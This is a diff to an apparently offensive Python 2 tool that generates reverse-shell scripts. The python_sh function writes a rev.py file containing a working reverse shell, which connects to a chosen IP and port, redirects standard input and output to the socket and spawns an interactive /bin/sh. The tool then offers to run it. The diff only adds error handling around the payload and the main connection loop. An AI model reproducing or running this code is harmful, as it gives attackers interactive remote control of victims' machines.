@@ -30,7 +30,7 @@ def bash_sh(ip,port):
 		print("[+] Your shell is ready")
 def python_sh(ip,port):
         f = open("rev.py", "w")
-        f.write('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'+ip+'",'+port+'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);')
+        f.write('import socket,sys,subprocess,os\ntry:\n\ts=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'+ip+'",'+port+'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\nexcept socket.error:\n\tprint("[!] Hostname could not be resolved.")\n\tsys.exit()')
         f.close()
         ex=raw_input("[*] Do you want to execute it? (Y/N)")
         if (ex=='Y'):
@@ -59,4 +59,10 @@ try:
 	choice(shell,ip,port)
 except KeyboardInterrupt:
 	print("\n[!] Exiting program")
+	sys.exit()
+except	socket.error:
+	print("Couldn't connect to server.")
+	sys.exit()
+except socket.gaierror:
+	print("Hostname could not be resolved.")
 	sys.exit()
